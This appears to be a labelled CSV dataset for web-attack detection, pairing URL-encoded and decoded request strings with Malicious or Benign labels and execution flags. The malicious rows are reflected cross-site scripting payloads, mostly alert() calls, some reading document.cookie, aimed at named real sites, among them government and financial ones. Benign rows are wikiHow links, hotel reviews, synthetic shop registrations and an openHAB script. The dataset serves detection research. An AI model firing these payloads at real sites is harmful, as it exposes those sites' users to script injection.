Payloads,Class,decoded,executed,parser_changed
http://tameside.gov.uk/history/archive.php3?strword=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://tameside.gov.uk/history/archive.php3?strword=<script>alert(document.cookie)</script>,True,True
"very classy hotel with great staff showreview(1378721, 'full');",Benign,"very classy hotel with great staff showreview(1378721, 'full');",False,False
http://www.wikihow.com/choose-kitchen-cabinet-designs&t=1396562716288&n=2567728&k=mainentity,Benign,http://www.wikihow.com/choose-kitchen-cabinet-designs&t=1396562716288&n=2567728&k=mainentity,False,False
http://www.kpbooks.com/details.asp?title=&lt;script&gt;alert(&quot;the%20best%20xsser&quot;)&lt;/script&gt;,Malicious,"http://www.kpbooks.com/details.asp?title=<script>alert(""the best xsser"")</script>",True,True
http://www.verifiedvotingfoundation.org/search.php?q=&lt;script&gt;alert(/xss/)&lt;/script&gt;,Malicious,http://www.verifiedvotingfoundation.org/search.php?q=<script>alert(/xss/)</script>,True,True
http://www.wikihow.com/make-your-yelp-bookmarks-public-from-the-yelp-for-iphone-app&t=1396629605614&n=5425837&k=mainentity,Benign,http://www.wikihow.com/make-your-yelp-bookmarks-public-from-the-yelp-for-iphone-app&t=1396629605614&n=5425837&k=mainentity,False,False
http://www.wikihow.com/release-a-bottlelox-bottle-lock-that-was-left-on-your-booze&t=1396517308425&n=305373&k=mainentity,Benign,http://www.wikihow.com/release-a-bottlelox-bottle-lock-that-was-left-on-your-booze&t=1396517308425&n=305373&k=mainentity,False,False
entrar&login=cavill&pwd=hetera&remember=off&b1=entrar,Benign,entrar&login=cavill&pwd=hetera&remember=off&b1=entrar,False,False
http://www.researchresearch.com/news.cfm?pagename=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.researchresearch.com/news.cfm?pagename=""><script>alert(""maxwel"")</script>",True,True
http://userfriendly.org/cgi-bin/survey.cgi?personalemail=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,"http://userfriendly.org/cgi-bin/survey.cgi?personalemail=""><script>alert(/xss/)</script>",True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ruppert2&password=65rti3ismo&nombre=alfonsina&apellidos=cimino+chac%f3n&email=nordstrom-driver%40inventoscaseros.pr&dni=65511934e&direccion=c%2f+doctor+rodriguez+de+la+fuente%2c+s%2fn+&ciudad=alqu%e9zar&cp=29493&provincia=santa+cruz+de+tenerife&ntc=7812097176228751&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ruppert2&password=65rti3ismo&nombre=alfonsina&apellidos=cimino chac�n&email=nordstrom-driver@inventoscaseros.pr&dni=65511934e&direccion=c/ doctor rodriguez de la fuente, s/n &ciudad=alqu�zar&cp=29493&provincia=santa cruz de tenerife&ntc=7812097176228751&b1=registrar",False,False
https://www.spotify.com/es/get-spotify/e-card/display/?code=jijiji&amp;amp;template=default&amp;amp;sender_n<br>ame=%3cscript%3ealert(%22oh%20hai%22)%3c/script%3e&amp;amp;recipient_name=sbd&amp;amp;email_message=&amp;amp;sen<br>der_email=root@cert.org&amp;amp;recipient_email=contacto@securitybydefault.com&amp;amp;duration=69,Malicious,"https://www.spotify.com/es/get-spotify/e-card/display/?code=jijiji&template=default&sender_name=<script>alert(""oh hai"")</script>&recipient_name=sbd&email_message=&sender_email=root@cert.org&recipient_email=contacto@securitybydefault.com&duration=69",True,True
http://www.wikihow.com/become-a-hafidzah&t=1396570051363&n=2931117&k=mainentity,Benign,http://www.wikihow.com/become-a-hafidzah&t=1396570051363&n=2931117&k=mainentity,False,False
https://www.americanexpress.ch/mr/de/praemienwelt/result.php?partnerrange=bmw'%3cscript%3ealert(docu<br>ment.cookie)%3c/script%3e,Malicious,https://www.americanexpress.ch/mr/de/praemienwelt/result.php?partnerrange=bmw'<script>alert(document.cookie)</script>,True,True
http://www.vtlanguedoc.com/register.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.vtlanguedoc.com/register.php?ref=""></a><script>alert(1);</script>",True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=luhcs&password=din95ist7&nombre=edelmira&apellidos=cerro&email=renard_lescoulie%40peli.com.bu&dni=51297332h&direccion=berlin%2c+169%2c+&ciudad=villanueva+de+oscos&cp=41928&provincia=burgos&ntc=5941162930127470&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=luhcs&password=din95ist7&nombre=edelmira&apellidos=cerro&email=renard_lescoulie@peli.com.bu&dni=51297332h&direccion=berlin, 169, &ciudad=villanueva de oscos&cp=41928&provincia=burgos&ntc=5941162930127470&b1=registrar",False,False
http://reflexes.samizdat.net/recherche.php?recherche=%3cscript%3ealert%28%27oi%21%2c+xylitol+is+back<br>%27%29%3c%2fscript%3e,Malicious,"http://reflexes.samizdat.net/recherche.php?recherche=<script>alert('oi!, xylitol is back')</script>",True,True
http://www.agc.army.mil/index.cfm?searchstring=%22%3e%3cscript%3ealert%28document.cookie%29%3c/scrip<br>t%3e&amp;input=search,Malicious,"http://www.agc.army.mil/index.cfm?searchstring=""><script>alert(document.cookie)</script>&input=search",True,True
http://www.wikihow.com/build-a-campfire-in-the-rain&t=1396609752728&n=4693067&k=mainentity,Benign,http://www.wikihow.com/build-a-campfire-in-the-rain&t=1396609752728&n=4693067&k=mainentity,False,False
entrar&login=buky&pwd=champ%fa&remember=off&b1=entrar,Benign,entrar&login=buky&pwd=champ�&remember=off&b1=entrar,False,False
http://www.wikihow.com/add-a-link-to-myspace-page&t=1396629772744&n=5433325&k=mainentity,Benign,http://www.wikihow.com/add-a-link-to-myspace-page&t=1396629772744&n=5433325&k=mainentity,False,False
http://www.blivit.org/blog/index.cfm?mode=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.blivit.org/blog/index.cfm?mode=""><script>alert(""maxwel"")</script>",True,True
http://www.flyfishinginmaine.com/story.php?id=58%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.flyfishinginmaine.com/story.php?id=58""><script>alert(document.cookie)</script>",True,True
registro&login=veit&password=gamonosa&nombre=flaviano&apellidos=rib%f3+cruanas&email=filogamo%40copiar.com.nu&dni=23865566f&direccion=carrer+pompeu+fabra%2c+151%2c+&ciudad=madrigal+del+monte&cp=01139&provincia=burgos&ntc=2938010074996541&b1=registrar,Benign,"registro&login=veit&password=gamonosa&nombre=flaviano&apellidos=rib� cruanas&email=filogamo@copiar.com.nu&dni=23865566f&direccion=carrer pompeu fabra, 151, &ciudad=madrigal del monte&cp=01139&provincia=burgos&ntc=2938010074996541&b1=registrar",False,False
http://online.wsj.com/public/quotes/main.html?symbol_or_name=%3cscript%3ealert%28%22xss |<br>hexspirit%22%29%3c%2fscript%3e&amp;x=12&amp;y=10&amp;sym_name_switch=name,Malicious,"http://online.wsj.com/public/quotes/main.html?symbol_or_name=<script>alert(""xss |hexspirit"")</script>&x=12&y=10&sym_name_switch=name",True,True
http://www.bmzg.net/search.asp?q=http%3a%2f%2fwww&amp;searchcityname=&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&amp;lx=0,Malicious,http://www.bmzg.net/search.asp?q=http://www&searchcityname=<script>alert(document.cookie)</script>&lx=0,True,True
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39&cantidad=27&b1=a%f1adir+al+carrito,Benign,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino rioja&precio=39&cantidad=27&b1=a�adir al carrito,False,False
https://secure.utah.gov/hflo2/hflo/login?customerid=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(%22xss%<br>22)%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee<br>%3e&amp;month=&amp;day=&amp;year=&amp;ssn1=&amp;ssn2=&amp;ssn3=&amp;login.continue=continue,Malicious,"https://secure.utah.gov/hflo2/hflo/login?customerid='""></title><script>alert(""xss"");</script><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>&month=&day=&year=&ssn1=&ssn2=&ssn3=&login.continue=continue",True,True
http://www.forms.gov.sk.ca/he/getformharness.asp?formname=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://www.forms.gov.sk.ca/he/getformharness.asp?formname=""><script>alert(1)</script>",True,True
"http://www.dysontt.com/main.php?id=9""><script>alert(document.cookie)</script>",Malicious,"http://www.dysontt.com/main.php?id=9""><script>alert(document.cookie)</script>",True,True
"very nice hotel hotel was recently remodeled. have stayed here in the past and the remodel makes it very hip and cool. the decor was modern with an asian flair. the bed is sooooo comfortable. service was nice. it's like they're trying to emulate a w hotel.drawbacks...though newly remodeled, bathroom overall needs work. tub is old, toilet is situated very close to the tub. sink did not have an effective stopper.",Benign,"very nice hotel hotel was recently remodeled. have stayed here in the past and the remodel makes it very hip and cool. the decor was modern with an asian flair. the bed is sooooo comfortable. service was nice. it's like they're trying to emulate a w hotel.drawbacks...though newly remodeled, bathroom overall needs work. tub is old, toilet is situated very close to the tub. sink did not have an effective stopper.",False,False
http://www.yenisalpazari.com/search.asp?mtd=1&amp;strkey=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.yenisalpazari.com/search.asp?mtd=1&strkey=""><script>alert(""backdoor"")</script>",True,True
http://www2.academic.com/academiconline/aolstudent.asp?prodtype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www2.academic.com/academiconline/aolstudent.asp?prodtype=""><script>alert(""maxwel"")</script>",True,True
http://www.wikihow.com/manage-money-as-a-college-freshman&t=1396613410118&n=4817043&k=mainentity,Benign,http://www.wikihow.com/manage-money-as-a-college-freshman&t=1396613410118&n=4817043&k=mainentity,False,False
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=seyed&password=nuera&nombre=lucas&apellidos=pi%f1ol+monguzzi&email=schuendler%40movilgoogle.at&dni=81743896x&direccion=el+empecinado+127+4%3fe&ciudad=cervera+del+llano&cp=06329&provincia=le%f3n&ntc=4593991243170323&b1=registrar,Benign,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=seyed&password=nuera&nombre=lucas&apellidos=pi�ol monguzzi&email=schuendler@movilgoogle.at&dni=81743896x&direccion=el empecinado 127 4?e&ciudad=cervera del llano&cp=06329&provincia=le�n&ntc=4593991243170323&b1=registrar,False,False
http://www.wikihow.com/fix-m3skin.dll-error&t=1396532852294&n=1084268&k=mainentity,Benign,http://www.wikihow.com/fix-m3skin.dll-error&t=1396532852294&n=1084268&k=mainentity,False,False
"great hotel this hotel was outstanding for my two night stay in dallas. i was there for rr, to visit a friend, to shop, and enjoy the nice weather. i had requested an early check-in which they were able to accoma",Benign,"great hotel this hotel was outstanding for my two night stay in dallas. i was there for rr, to visit a friend, to shop, and enjoy the nice weather. i had requested an early check-in which they were able to accoma",False,False
"/** * habmin - the openhab admin interface * * openhab, the open home automation bus. * copyright (c) 2010-2013, openhab.org <admin@openhab.org> * * see the contributors.txt file in the distribution for a * full listing of individual contributors. * * this program is free software; you can redistribute it and/or modify * it under the terms of the gnu general public license as * published by the free software foundation; either version 3 of the * license, or (at your option) any later version. * * this program is distributed in the hope that it will be useful, * but without any warranty; without even the implied warranty of * merchantability or fitness for a particular purpose. see the * gnu general public license for more details. * * you should have received a copy of the gnu general public license * along with this program; if not, see <http://www.gnu.org/licenses>. * * additional permission under gnu gpl version 3 section 7 * * if you modify this program, or any covered work, by linking or * combining it with eclipse (or a modified version of that library), * containing parts covered by the terms of the eclipse public license * (epl), the licensors of this program grant you additional permission * to convey the resulting work. *//** * openhab admin console habmin * * @author chris jackson */var lookupstore;ext.define(\'openhab.config.mappingproperties\', { extend: \'ext.panel.panel\', layout: \'fit\', header: false, initcomponent: function () { this.tabtip = language.config_mappingpropertiestip; ext.define(\'maplist\', { extend: \'ext.data.model\', fields: [ {name: \'minimum\'}, {name: \'maximum\'}, {name: \'label\'}, {name: \'colour\'}, {name: \'icon\'} ] }); // create the data store lookupstore = ext.create(\'ext.data.arraystore\', { model: \'maplist\' }); var tbmapping = ext.create(\'ext.toolbar.toolbar\', { items: [ { icon: \'images/cross.png\', itemid: \'cancel\', text: language.cancel, cls: \'x-btn-icon\', disabled: true, tooltip: language.config_mappingpropertiescanceltip, handler: function () { //ext.getcmp(\""configlookuptb-save\"").disable(); //ext.getcmp(\""configlookuptb-cancel\"").disable(); //ext.getcmp(\""configlookuptb-add\"").enable(); //ext.getcmp(\""configlookuptb-delete\"").disable(); // reset to the current data var prop = ext.getcmp(\'configproperties\').getstore(); var service = prop.getat(1).get(\'value\'); var variable = prop.getat(2).get(\'value\'); setconfigvariabledata(configdeviceid, service, variable); } }, { icon: \'images/disk.png\', itemid: \'save\', text: language.save, cls: \'x-btn-icon\', disabled: true, tooltip: language.config_mappingpropertiessavetip, handler: function () { //ext.getcmp(\""configlookuptb-save\"").disable(); //ext.getcmp(\""configlookuptb-cancel\"").disable(); //ext.getcmp(\""configlookuptb-add\"").enable(); saveconfigvariabledata(); } }, { icon: \'images/plus-button.png\', itemid: \'add\', text: language.add, cls: \'x-btn-icon\', disabled: true, tooltip: language.config_mappingpropertiesaddtip, handler: function () { //ext.getcmp(\""configlookuptb-save\"").enable(); //ext.getcmp(\""configlookuptb-cancel\"").enable(); var newvar = {}; newvar.value = 0; newvar.label = language.config_mappingpropertiesnewlabel; lookupstore.add(newvar); } }, { icon: \'images/minus-button.png\', itemid: \'delete\', text: language.delete, cls: \'x-btn-icon\', disabled: true, tooltip: language.config_mappingpropertiesdeletetip, handler: function () { //ext.getcmp(\""configlookuptb-save\"").enable(); //ext.getcmp(\""configlookuptb-cancel\"").enable(); //ext.getcmp(\""configlookuptb-add\"").enable(); //ext.getcmp(\""configlookuptb-delete\"").disable(); var selection = ext.getcmp(\""gridlookup\"").getview().getselectionmodel().getselection()[0]; if (selection) { lookupstore.remove(selection); } } } ] }); this.cellediting = new ext.grid.plugin.cellediting({ clickstoedit: 1 }); var itemmapping = ext.create(\'ext.grid.panel\', { xtype: \'cell-editing\', title: language.config_mappingpropertiesgridtitle, icon: \'images/tables-relation.png\', header: false, plugins: [this.cellediting], store: lookupstore, columns: [ { header: language.config_mappingpropertiesgridminimum, dataindex: \'minimum\', width: 75, editor: { allowblank: false } }, { header: language.config_mappingpropertiesgridmaximum, dataindex: \'maximum\', width: 75, editor: { allowblank: false } }, { header: language.config_mappingpropertiesgridlabel, dataindex: \'label\', width: 300, editor: { allowblank: false } }, { header: language.config_mappingpropertiesgridvalue, dataindex: \'value\', editor: { allowblank: false } }, { header: language.config_mappingpropertiesgridicon, dataindex: \'icon\', editor: { allowblank: false } } ], selmodel: { seltype: \'cellmodel\' }, tbar: tbmapping, listeners: { beforeedit: function (dv, record, item, index, e) { ext.getcmp(\""configlookuptb-delete\"").enable(); }, edit: function (dv, record, item, index, e) { ext.getcmp(\""configlookuptb-save\"").enable(); } } }); var tabs = ext.create(\'ext.tab.panel\', { layout: \'fit\', border: false, items: [itemmapping] }); this.items = tabs; this.callparent(); }});'",Benign,"/** * habmin - the openhab admin interface * * openhab, the open home automation bus. * copyright (c) 2010-2013, openhab.org <admin@openhab.org> * * see the contributors.txt file in the distribution for a * full listing of individual contributors. * * this program is free software; you can redistribute it and/or modify * it under the terms of the gnu general public license as * published by the free software foundation; either version 3 of the * license, or (at your option) any later version. * * this program is distributed in the hope that it will be useful, * but without any warranty; without even the implied warranty of * merchantability or fitness for a particular purpose. see the * gnu general public license for more details. * * you should have received a copy of the gnu general public license * along with this program; if not, see <http://www.gnu.org/licenses>. * * additional permission under gnu gpl version 3 section 7 * * if you modify this program, or any covered work, by linking or * combining it with eclipse (or a modified version of that library), * containing parts covered by the terms of the eclipse public license * (epl), the licensors of this program grant you additional permission * to convey the resulting work. *//** * openhab admin console habmin * * @author chris jackson */var lookupstore;ext.define(\'openhab.config.mappingproperties\', { extend: \'ext.panel.panel\', layout: \'fit\', header: false, initcomponent: function () { this.tabtip = language.config_mappingpropertiestip; ext.define(\'maplist\', { extend: \'ext.data.model\', fields: [ {name: \'minimum\'}, {name: \'maximum\'}, {name: \'label\'}, {name: \'colour\'}, {name: \'icon\'} ] }); // create the data store lookupstore = ext.create(\'ext.data.arraystore\', { model: \'maplist\' }); var tbmapping = ext.create(\'ext.toolbar.toolbar\', { items: [ { icon: \'images/cross.png\', itemid: \'cancel\', text: language.cancel, cls: \'x-btn-icon\', disabled: true, tooltip: language.config_mappingpropertiescanceltip, handler: function () { //ext.getcmp(\""configlookuptb-save\"").disable(); //ext.getcmp(\""configlookuptb-cancel\"").disable(); //ext.getcmp(\""configlookuptb-add\"").enable(); //ext.getcmp(\""configlookuptb-delete\"").disable(); // reset to the current data var prop = ext.getcmp(\'configproperties\').getstore(); var service = prop.getat(1).get(\'value\'); var variable = prop.getat(2).get(\'value\'); setconfigvariabledata(configdeviceid, service, variable); } }, { icon: \'images/disk.png\', itemid: \'save\', text: language.save, cls: \'x-btn-icon\', disabled: true, tooltip: language.config_mappingpropertiessavetip, handler: function () { //ext.getcmp(\""configlookuptb-save\"").disable(); //ext.getcmp(\""configlookuptb-cancel\"").disable(); //ext.getcmp(\""configlookuptb-add\"").enable(); saveconfigvariabledata(); } }, { icon: \'images/plus-button.png\', itemid: \'add\', text: language.add, cls: \'x-btn-icon\', disabled: true, tooltip: language.config_mappingpropertiesaddtip, handler: function () { //ext.getcmp(\""configlookuptb-save\"").enable(); //ext.getcmp(\""configlookuptb-cancel\"").enable(); var newvar = {}; newvar.value = 0; newvar.label = language.config_mappingpropertiesnewlabel; lookupstore.add(newvar); } }, { icon: \'images/minus-button.png\', itemid: \'delete\', text: language.delete, cls: \'x-btn-icon\', disabled: true, tooltip: language.config_mappingpropertiesdeletetip, handler: function () { //ext.getcmp(\""configlookuptb-save\"").enable(); //ext.getcmp(\""configlookuptb-cancel\"").enable(); //ext.getcmp(\""configlookuptb-add\"").enable(); //ext.getcmp(\""configlookuptb-delete\"").disable(); var selection = ext.getcmp(\""gridlookup\"").getview().getselectionmodel().getselection()[0]; if (selection) { lookupstore.remove(selection); } } } ] }); this.cellediting = new ext.grid.plugin.cellediting({ clickstoedit: 1 }); var itemmapping = ext.create(\'ext.grid.panel\', { xtype: \'cell-editing\', title: language.config_mappingpropertiesgridtitle, icon: \'images/tables-relation.png\', header: false, plugins: [this.cellediting], store: lookupstore, columns: [ { header: language.config_mappingpropertiesgridminimum, dataindex: \'minimum\', width: 75, editor: { allowblank: false } }, { header: language.config_mappingpropertiesgridmaximum, dataindex: \'maximum\', width: 75, editor: { allowblank: false } }, { header: language.config_mappingpropertiesgridlabel, dataindex: \'label\', width: 300, editor: { allowblank: false } }, { header: language.config_mappingpropertiesgridvalue, dataindex: \'value\', editor: { allowblank: false } }, { header: language.config_mappingpropertiesgridicon, dataindex: \'icon\', editor: { allowblank: false } } ], selmodel: { seltype: \'cellmodel\' }, tbar: tbmapping, listeners: { beforeedit: function (dv, record, item, index, e) { ext.getcmp(\""configlookuptb-delete\"").enable(); }, edit: function (dv, record, item, index, e) { ext.getcmp(\""configlookuptb-save\"").enable(); } } }); var tabs = ext.create(\'ext.tab.panel\', { layout: \'fit\', border: false, items: [itemmapping] }); this.items = tabs; this.callparent(); }});'",False,True
